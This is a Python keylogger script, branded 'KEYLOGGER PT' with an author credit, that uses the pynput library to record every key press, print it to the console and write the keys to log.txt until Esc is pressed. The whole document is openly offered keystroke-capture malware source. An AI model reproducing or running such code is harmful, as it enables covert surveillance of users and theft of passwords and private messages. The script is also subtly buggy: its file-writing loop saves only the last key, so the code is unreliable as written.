from pystyle import *
import pynput
from pynput.keyboard import Key, Listener
banner = '''
||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||
| 1 1 1 0 ╔══════════════════════════════════════════════╗ 1 0 0 1 |
| 0 1 1 0 ║ KEYLOGGER PT 1.0.0.0                         ║ 0 1 0 1 |
| 0 1 0 1 ║                     Coded By Francisco Sousa ║ 1 1 0 1 |
| 1 1 0 0 ║ Instagram: francisco._sousa_                 ║ 1 0 0 0 |
| 1 0 1 1 ╚══════════════════════════════════════════════╝ 0 0 0 1 |
||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||          
'''
print(Colorate.Horizontal(Colors.blue_to_purple, Center.XCenter(banner)))
keys = []
def on_press(key):
    keys.append(key)
    write_file(keys)
    try:
        print('{}'.format(key.char))
    except AttributeError:
        print('Especial {0} '.format(key))
def write_file(keys):
    with open('log.txt', 'w') as f:
        for key in keys:
            k = str(key).replace("'", "")
        f.write(k)
        f.write(' ')
def on_release(key):
    if key == Key.esc:
        return False
with Listener(on_press=on_press,
              on_release=on_release) as listener:
    listener.join()
